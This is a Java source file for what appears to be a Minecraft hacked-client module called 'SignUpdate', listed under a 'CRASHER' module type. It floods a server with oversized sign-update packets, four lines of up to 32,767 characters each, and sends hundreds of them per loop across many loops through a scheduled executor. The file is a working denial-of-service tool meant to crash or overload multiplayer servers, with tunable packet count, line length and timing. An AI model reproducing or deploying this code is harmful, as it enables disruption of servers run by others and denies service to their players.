package me.dannycrasher.client.module.impl.crash;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.Protocol;
import me.dannycrasher.client.protocol.packets.play.PacketSignUpdate;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;

public class SignUpdateCrash extends Module {
	private ScheduledExecutorService executorService;

	public SignUpdateCrash() {
		super("SignUpdate", "Serverbound sign-update text flood (sign packet Abuser)", ModuleType.CRASHER);
		addArgument("packets", ArgumentType.INT, 1, 5000, "500");
		addArgument("lineLength", ArgumentType.INT, 1, 32767, "384");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "100");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		if (!Protocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
			context.sendMessage("<red>Unsupported protocol: <aqua>" + protocol);
			return;
		}

		String line = "A".repeat(context.getInt("lineLength"));
		BlockPos pos = Minecraft.getInstance().player != null
				? Minecraft.getInstance().player.blockPosition()
				: BlockPos.ZERO;
		long packed = BlockPos.asLong(pos.getX(), pos.getY(), pos.getZ());

		executorService = ClickCrashRunner.startPackets(
				this,
				context,
				executorService,
				() -> new PacketSignUpdate(protocol, packed, true, line, line, line, line),
				context.getInt("packets"),
				context.getInt("threadSleep"),
				context.getInt("loopAmount")
		);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		ClickCrashRunner.shutdown(executorService);
	}
}
